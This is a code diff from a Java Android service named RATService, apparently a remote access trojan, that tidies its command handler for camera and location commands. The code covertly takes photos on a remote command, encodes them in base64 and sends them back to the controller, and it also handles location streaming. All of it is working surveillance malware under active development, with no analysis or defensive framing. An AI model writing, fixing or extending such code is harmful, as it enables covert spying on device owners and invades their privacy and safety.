@@ -553,34 +553,35 @@ public class RATService extends Service {
                 handleLocationStreamCommand(args);
                 break;
                 
+            // CAMERA COMMANDS - FIXED: Removed duplicate case
             case "camera":
-           case "camera":
-case "camera_photo":
-    if (cameraModule != null) {
-        Log.d(TAG, "📸 Taking photo with camera module");
-        cameraModule.takePhoto(new CameraModule.CameraCallback() {
-            @Override
-            public void onPhotoTaken(String base64Image) {
-                Log.d(TAG, "📸 Photo taken, sending response");
-                sendCommand(base64Image);
-            }
-            
-            @Override
-            public void onError(String error) {
-                Log.e(TAG, "📸 Camera error: " + error);
-                sendCommand(error);
-            }
-        });
-    } else {
-        Log.e(TAG, "📸 Camera module is null");
-        sendCommand("CAMERA|ERROR: Camera module not available");
-    }
-    break;
+            case "camera_photo":
+                if (cameraModule != null) {
+                    Log.d(TAG, "📸 Taking photo with camera module");
+                    cameraModule.takePhoto(new CameraModule.CameraCallback() {
+                        @Override
+                        public void onPhotoTaken(String base64Image) {
+                            Log.d(TAG, "📸 Photo taken, sending response");
+                            sendCommand(base64Image);
+                        }
+                        
+                        @Override
+                        public void onError(String error) {
+                            Log.e(TAG, "📸 Camera error: " + error);
+                            sendCommand(error);
+                        }
+                    });
+                } else {
+                    Log.e(TAG, "📸 Camera module is null");
+                    sendCommand("CAMERA|ERROR: Camera module not available");
+                }
+                break;
                 
             case "camera_switch":
                 if (cameraModule != null) {
                     String result = cameraModule.switchCamera();
-                    sendCommand(result); // This already includes "CAMERA_SWITCH|" prefix
+                    Log.d(TAG, "📸 Camera switch: " + result);
+                    sendCommand(result);
                 } else {
                     sendCommand("CAMERA_SWITCH|ERROR: Camera module not available");
                 }
@@ -589,7 +590,8 @@ case "camera_photo":
             case "camera_info":
                 if (cameraModule != null) {
                     String result = cameraModule.getCurrentCameraInfo();
-                    sendCommand(result); // This already includes "CAMERA_INFO|" prefix
+                    Log.d(TAG, "📸 Camera info: " + result);
+                    sendCommand(result);
                 } else {
                     sendCommand("CAMERA_INFO|ERROR: Camera module not available");
                 }
